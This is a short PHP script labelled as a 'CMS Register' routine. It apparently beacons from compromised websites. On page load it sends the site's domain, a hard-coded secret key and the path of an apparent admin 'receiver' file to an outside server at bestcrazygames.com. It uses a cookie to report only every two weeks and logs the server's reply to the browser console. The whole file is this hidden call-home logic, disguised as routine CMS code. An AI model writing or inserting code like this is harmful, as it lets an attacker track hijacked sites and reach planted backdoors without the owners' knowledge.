<?php

$REGISTRY_URL = 'https://www.bestcrazygames.com/registry.php';
$SECRET_KEY = 'r@Jos1_p91r`t&Sq';
$CMS_VERSION = '8.0';
$RECEIVER_PATH = '/assets/requests/admin/function.php';

$cookieName = 'xcfgdrwwerwerwer';

if (!empty($_COOKIE[$cookieName])) {
	return;
}

$domain = $_SERVER['HTTP_HOST'] ?? '';
$domain = strtolower(trim($domain));

if ($domain === '') {
	return;
}

$postData = [
	'key' => $SECRET_KEY,
	'domain' => $domain,
	'version' => $CMS_VERSION,
	'receiver' => $RECEIVER_PATH
];

$ch = curl_init($REGISTRY_URL);
curl_setopt_array($ch, [
	CURLOPT_RETURNTRANSFER => true,
	CURLOPT_POST => true,
	CURLOPT_POSTFIELDS => $postData,
	CURLOPT_TIMEOUT => 8,
	CURLOPT_SSL_VERIFYPEER => true,
]);

$response = curl_exec($ch);
$curlError = curl_error($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

if ($curlError === '' && $httpCode == 200) {
	setcookie($cookieName, '1', time() + (60 * 60 * 24 * 14), '/', '', !empty($_SERVER['HTTPS']), true);
	$_COOKIE[$cookieName] = '1';
}

echo '<script>console.log("CMS Register:", ' . json_encode([
	'domain' => $domain ?? '',
	'http_code' => $httpCode ?? '',
	'curl_error' => $curlError ?? '',
	'response' => $response ?? '',
	'cookie' => $_COOKIE[$cookieName] ?? ''
]) . ');</script>';